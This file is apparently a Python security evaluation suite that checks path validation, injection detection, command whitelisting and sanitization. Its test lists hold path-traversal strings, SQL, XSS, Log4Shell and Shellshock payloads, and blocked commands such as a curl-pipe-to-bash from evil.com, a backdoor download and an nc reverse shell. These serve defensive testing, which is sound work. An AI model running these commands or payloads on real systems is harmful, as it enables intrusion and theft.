"""Security evaluation suite.

Tests path traversal blocking, injection pattern detection,
command whitelist enforcement, content sanitization, and false positive rates.
"""

from __future__ import annotations

import time
from typing import Any

from cap.eval.framework import EvalCase, EvalResult, EvalSuite, MetricType


# ---------------------------------------------------------------------------
# Test vectors
# ---------------------------------------------------------------------------

# Path traversal attempts (should ALL be blocked)
PATH_TRAVERSAL_ATTACKS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/docs/../../../etc/shadow",
    "valid/path/../../../../root/.ssh/id_rsa",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/docs/./../../etc/hosts",
    "path/to/file\x00.txt",  # Null byte injection
    "/docs/valid/../../../proc/self/environ",
    "\\..\\..\\..\\boot.ini",
]

# Safe paths (should NOT be blocked)
SAFE_PATHS = [
    "/docs/architecture/overview.md",
    "/docs/runbooks/incident-response.md",
    "/workspace/repos/aws-infra/main.tf",
    "/workspace/repos/k8s-infra/charts/values.yaml",
    "relative/but/safe/path.txt",
    "/docs/deep/nested/directory/file.md",
    "/workspace/repos/alerting/rules/critical.yaml",
    "/docs/terraform/modules/vpc/README.md",
]

# Injection patterns (should be detected)
INJECTION_ATTACKS = [
    "'; DROP TABLE entries; --",
    "<script>alert('xss')</script>",
    "{{7*7}}",  # Template injection
    "${jndi:ldap://evil.com/a}",  # Log4Shell
    "() { :; }; /bin/bash -c 'cat /etc/passwd'",  # Shellshock
    "admin' OR '1'='1",
    "UNION SELECT * FROM users--",
    "__import__('os').system('rm -rf /')",
    "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))",
    "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",  # SSI injection
]

# Benign content (should NOT trigger injection detection)
BENIGN_CONTENT = [
    "The deployment script uses terraform apply to provision infrastructure.",
    "SELECT count(*) FROM entries WHERE workspace = 'production'",  # Valid SQL in docs
    "The template uses {{ .Values.image.tag }} for Helm variable substitution.",
    "Use the OR operator in PromQL: metric_a or metric_b",
    "The function drops unused columns from the dataframe.",
    "Import the module with: from cap.lib.retrieval import hybrid_search",
    "Shell script example: if [ -f /etc/config ]; then source /etc/config; fi",
    "The UNION of sets A and B gives all unique elements.",
    "To compile the project, run make build && make test",
    "The application uses eval() for dynamic expression evaluation in sandboxed mode.",
]

# Fleet commands (whitelist testing)
ALLOWED_COMMANDS = [
    ["python", "-m", "cap", "status"],
    ["python3", "script.py", "--arg", "value"],
    ["node", "server.js"],
    ["npx", "prisma", "migrate", "deploy"],
    ["uvx", "ruff", "check", "."],
    ["docker", "build", "-t", "myapp:latest", "."],
]

BLOCKED_COMMANDS = [
    ["rm", "-rf", "/"],
    ["curl", "http://evil.com/shell.sh", "|", "bash"],
    ["bash", "-c", "reverse shell payload"],
    ["sudo", "apt-get", "install", "malware"],
    ["chmod", "777", "/etc/passwd"],
    ["wget", "http://evil.com/backdoor"],
    ["/bin/sh", "-i"],
    ["nc", "-e", "/bin/bash", "10.0.0.1", "4444"],
    ["perl", "-e", "use Socket;..."],
    ["cat", "/etc/shadow"],
]


# ---------------------------------------------------------------------------
# Suite implementation
# ---------------------------------------------------------------------------


class SecurityEvalSuite(EvalSuite):
    """Evaluates security controls: path validation, injection detection, command whitelisting."""

    name = "security"
    description = "Measures security control effectiveness and false positive rates"

    def __init__(self) -> None:
        super().__init__()
        self._allowed_root = "/workspace"

    def setup(self) -> None:
        """No setup needed — security functions are stateless."""

    def teardown(self) -> None:
        """No teardown needed."""

    def build_cases(self) -> list[EvalCase]:
        """Build security eval cases."""
        cases: list[EvalCase] = []

        # --- Path traversal blocking ---
        for i, path in enumerate(PATH_TRAVERSAL_ATTACKS):
            cases.append(
                EvalCase(
                    name=f"path_traversal_blocked_{i}",
                    category="path_traversal",
                    input={"path": path, "root": self._allowed_root},
                    expected=True,  # Should be blocked (raise ValueError)
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        # --- Safe paths should pass ---
        for i, path in enumerate(SAFE_PATHS):
            cases.append(
                EvalCase(
                    name=f"safe_path_allowed_{i}",
                    category="path_traversal",
                    input={"path": path, "root": "/"},
                    expected=False,  # Should NOT be blocked
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        # --- Injection detection ---
        for i, payload in enumerate(INJECTION_ATTACKS):
            cases.append(
                EvalCase(
                    name=f"injection_detected_{i}",
                    category="injection_detection",
                    input=payload,
                    expected=True,  # Should be detected/sanitized
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        # --- False positive rate (benign content should pass) ---
        for i, content in enumerate(BENIGN_CONTENT):
            cases.append(
                EvalCase(
                    name=f"benign_content_passes_{i}",
                    category="false_positive",
                    input=content,
                    expected=False,  # Should NOT be flagged
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        # --- Command whitelist enforcement ---
        for i, cmd in enumerate(ALLOWED_COMMANDS):
            cases.append(
                EvalCase(
                    name=f"command_allowed_{i}",
                    category="command_whitelist",
                    input=cmd,
                    expected=True,  # Should be allowed
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        for i, cmd in enumerate(BLOCKED_COMMANDS):
            cases.append(
                EvalCase(
                    name=f"command_blocked_{i}",
                    category="command_whitelist",
                    input=cmd,
                    expected=False,  # Should be blocked
                    metric=MetricType.EXACT_MATCH,
                    threshold=1.0,
                )
            )

        # --- Sanitization thoroughness ---
        cases.append(
            EvalCase(
                name="sanitize_max_length_enforcement",
                category="sanitization",
                input="A" * 2_000_000,  # 2MB input
                expected=1_048_576,  # Should be truncated to 1MB
                metric=MetricType.EXACT_MATCH,
                threshold=1.0,
            )
        )
        cases.append(
            EvalCase(
                name="sanitize_empty_content",
                category="sanitization",
                input="",
                expected="raises",  # Should raise ValueError for empty
                metric=MetricType.EXACT_MATCH,
                threshold=1.0,
            )
        )
        cases.append(
            EvalCase(
                name="sanitize_whitespace_only",
                category="sanitization",
                input="   \t\n  ",
                expected="raises",  # Should raise ValueError for whitespace-only
                metric=MetricType.EXACT_MATCH,
                threshold=1.0,
            )
        )

        # --- Aggregate metrics ---
        cases.append(
            EvalCase(
                name="overall_path_block_rate",
                category="aggregate",
                input="path_block_rate",
                expected=1.0,  # 100% of attacks should be blocked
                metric=MetricType.EXACT_MATCH,
                threshold=0.9,
            )
        )
        cases.append(
            EvalCase(
                name="overall_false_positive_rate",
                category="aggregate",
                input="false_positive_rate",
                expected=0.0,  # 0% false positives target
                metric=MetricType.COST_UNDER,  # Lower is better
                threshold=1.0,
                metadata={"budget": 0.1},  # Allow up to 10% FP rate
            )
        )

        return cases

    def evaluate_case(self, case: EvalCase) -> EvalResult:
        """Run a single security eval case."""
        if case.category == "path_traversal":
            return self._eval_path_traversal(case)
        elif case.category == "injection_detection":
            return self._eval_injection(case)
        elif case.category == "false_positive":
            return self._eval_false_positive(case)
        elif case.category == "command_whitelist":
            return self._eval_command_whitelist(case)
        elif case.category == "sanitization":
            return self._eval_sanitization(case)
        elif case.category == "aggregate":
            return self._eval_aggregate(case)
        else:
            return EvalResult(
                case=case, actual=None, score=0.0, passed=False, latency_ms=0.0,
                details={"reason": f"Unknown category: {case.category}"},
            )

    def _eval_path_traversal(self, case: EvalCase) -> EvalResult:
        """Test path validation."""
        from cap.lib.security import validate_path

        path = case.input["path"]
        root = case.input["root"]
        should_block = case.expected

        t0 = time.perf_counter()
        try:
            validate_path(path, root)
            was_blocked = False
        except (ValueError, OSError):
            was_blocked = True
        latency_ms = (time.perf_counter() - t0) * 1000

        score = 1.0 if was_blocked == should_block else 0.0
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=was_blocked, score=score, passed=passed,
            latency_ms=latency_ms,
            details={
                "path": path,
                "was_blocked": was_blocked,
                "should_block": should_block,
                "reason": "pass" if passed else f"expected block={should_block}, got {was_blocked}",
            },
        )

    def _eval_injection(self, case: EvalCase) -> EvalResult:
        """Test injection pattern detection."""
        from cap.lib.security import sanitize_content

        payload = case.input
        t0 = time.perf_counter()

        try:
            result = sanitize_content(payload, field_name="test_input")
            # If sanitize_content doesn't raise, check if content was modified
            was_detected = result != payload
        except ValueError:
            # Raised = detected and rejected
            was_detected = True

        latency_ms = (time.perf_counter() - t0) * 1000
        score = 1.0 if was_detected == case.expected else 0.0
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=was_detected, score=score, passed=passed,
            latency_ms=latency_ms,
            details={
                "payload_preview": payload[:50],
                "detected": was_detected,
                "reason": "pass" if passed else f"injection not detected: {payload[:30]}...",
            },
        )

    def _eval_false_positive(self, case: EvalCase) -> EvalResult:
        """Test that benign content is not flagged."""
        from cap.lib.security import sanitize_content

        content = case.input
        t0 = time.perf_counter()

        try:
            result = sanitize_content(content, field_name="test_input")
            was_flagged = result != content
        except ValueError:
            was_flagged = True

        latency_ms = (time.perf_counter() - t0) * 1000

        # expected=False means it should NOT be flagged
        score = 1.0 if was_flagged == case.expected else 0.0
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=was_flagged, score=score, passed=passed,
            latency_ms=latency_ms,
            details={
                "content_preview": content[:50],
                "was_flagged": was_flagged,
                "reason": "pass" if passed else f"false positive on: {content[:30]}...",
            },
        )

    def _eval_command_whitelist(self, case: EvalCase) -> EvalResult:
        """Test command whitelist enforcement."""
        from cap.lib.security import validate_fleet_command

        command = case.input
        expected_allowed = case.expected

        t0 = time.perf_counter()
        is_allowed = validate_fleet_command(command)
        latency_ms = (time.perf_counter() - t0) * 1000

        score = 1.0 if is_allowed == expected_allowed else 0.0
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=is_allowed, score=score, passed=passed,
            latency_ms=latency_ms,
            details={
                "command": command,
                "allowed": is_allowed,
                "expected": expected_allowed,
                "reason": "pass" if passed else f"expected allowed={expected_allowed}, got {is_allowed}",
            },
        )

    def _eval_sanitization(self, case: EvalCase) -> EvalResult:
        """Test content sanitization edge cases."""
        from cap.lib.security import sanitize_content

        content = case.input
        t0 = time.perf_counter()

        if case.expected == "raises":
            try:
                sanitize_content(content, field_name="test_input")
                actual = "no_raise"
                score = 0.0
            except (ValueError, TypeError):
                actual = "raises"
                score = 1.0
        else:
            try:
                result = sanitize_content(content, field_name="test_input")
                actual = len(result)
                score = 1.0 if actual <= case.expected else 0.0
            except (ValueError, TypeError):
                actual = "raised_unexpectedly"
                score = 0.0

        latency_ms = (time.perf_counter() - t0) * 1000
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=actual, score=score, passed=passed,
            latency_ms=latency_ms,
            details={"reason": "pass" if passed else f"actual={actual}, expected={case.expected}"},
        )

    def _eval_aggregate(self, case: EvalCase) -> EvalResult:
        """Compute aggregate security metrics from previously run cases."""
        t0 = time.perf_counter()

        if case.input == "path_block_rate":
            # Count path traversal results from already-run cases
            path_cases = [r for r in self._results if r.case.category == "path_traversal"
                         and r.case.expected is True]
            if path_cases:
                blocked = sum(1 for r in path_cases if r.actual is True)
                actual = blocked / len(path_cases)
            else:
                actual = 1.0
            score = 1.0 if actual >= case.threshold else actual
        elif case.input == "false_positive_rate":
            # Count false positive cases
            fp_cases = [r for r in self._results if r.case.category == "false_positive"]
            if fp_cases:
                flagged = sum(1 for r in fp_cases if r.actual is True)
                actual = flagged / len(fp_cases)
            else:
                actual = 0.0
            budget = case.metadata.get("budget", 0.1)
            from cap.eval.framework import score_cost_under
            score = score_cost_under(actual, budget)
        else:
            actual = None
            score = 0.0

        latency_ms = (time.perf_counter() - t0) * 1000
        passed = score >= case.threshold

        return EvalResult(
            case=case, actual=actual, score=score, passed=passed,
            latency_ms=latency_ms,
            details={"reason": "pass" if passed else f"aggregate score {score:.3f} < {case.threshold}"},
        )
